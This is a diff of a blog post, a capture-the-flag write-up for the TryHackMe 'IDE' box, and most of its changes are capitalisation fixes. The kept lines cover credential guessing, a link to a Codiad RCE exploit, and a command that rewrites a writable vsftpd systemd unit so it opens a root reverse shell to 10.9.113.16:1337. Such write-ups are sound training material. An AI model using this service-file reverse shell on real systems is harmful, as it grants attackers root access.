@@ -6,7 +6,6 @@ author: "Peter Lymo"
 showToc: true
 description: "Try Hack Me- IDE Writeup"
 canonicalURL: "https://canonical.url/to/page"
-disableHLJS: true # to disable highlightjs
 disableHLJS: false
 searchHidden: true
 ShowReadingTime: true
@@ -18,7 +17,7 @@ images: ["img/ide-image.png"]
 ---
 
 **Hi, There,**
-I got a spare time to solve IDE box from try hack me, here is how i did it, this a easy box that help you with enumerations skills when doing penetration tests.lets see how to solve this easy box peacefully.   
+I got a spare time to solve IDE box from try hack me, here is how I did it, this a easy box that help you with enumerations skills when doing penetration tests.lets see how to solve this easy box peacefully.   
 
 ![ide-image](img/ide-image.png)
 
@@ -125,7 +124,7 @@ we target website on port 62337, search for codiac 2.8.4 exploit
 
 Codiad 2.8.4 has suffered from Remote Code Execution (Authenticated) , since its Authenticated bug then we must have a credentials to exploit
 ### Exploit
-tested for default credentials and didn't work, i decided to check for FTP service
+tested for default credentials and didn't work, I decided to check for FTP service
 found the hidden folder `...` and inside the file called `-`
 ![img4](img/image4.png)
 
@@ -133,7 +132,7 @@ content of `-` file
 
 ![img5](img/image5.png)
 
-i guessed credentials could be john: password
+I guessed credentials could be john: password
 
 found this POC link [codiac POC](https://github.com/WangYihang/Codiad-Remote-Code-Execute-Exploit)
 
@@ -164,7 +163,7 @@ ready to go, so you can use sudo,su, etc
 
 ## shell as  drac
 
-looking around, i wanted to upload linpeas but i could not, so i decided to go manual looking for juicy file, then i found password under drac home bash history
+looking around, I wanted to upload linpeas but I could not, so I decided to go manual looking for juicy file, then I found password under drac home bash history
 
 ```
 
@@ -230,7 +229,7 @@ User drac may run the following commands on ide:
 ### Vulnerability Details
 
 The **service** command is vulnerable to privilege escalation if we can execute as root.
-so i searched for exploit
+so I searched for exploit
 ![img7](img/image7.png)
 
 
@@ -270,7 +269,7 @@ drac@ide:~$ ls -la /lib/systemd/system/vsftpd.service
 we can see file is writable with group drac, well means we can write it
 
 final exploit , on IDE client machine
-i did this using `echo` to rewrite existing service configuration with mine, that will give me root shell when vsftpd restarted as root
+I did this using `echo` to rewrite existing service configuration with mine, that will give me root shell when vsftpd restarted as root
 ```
 drac@ide:~$ echo -e "Description=vsftpd FTP server \nAfter=network.target \n[Service] \nType=simple \nExecStart=/usr/sbin/vsftpd /etc/vsftpd.conf \nExecReload=/bin/kill -HUP $MAINPID \nExecStartPre=/bin/bash -c 'bash -i >& /dev/tcp/10.9.113.16/1337 0>&1' \n[Install] \nWantedBy=multi-user.target" > /lib/systemd/system/vsftpd.service
 ```
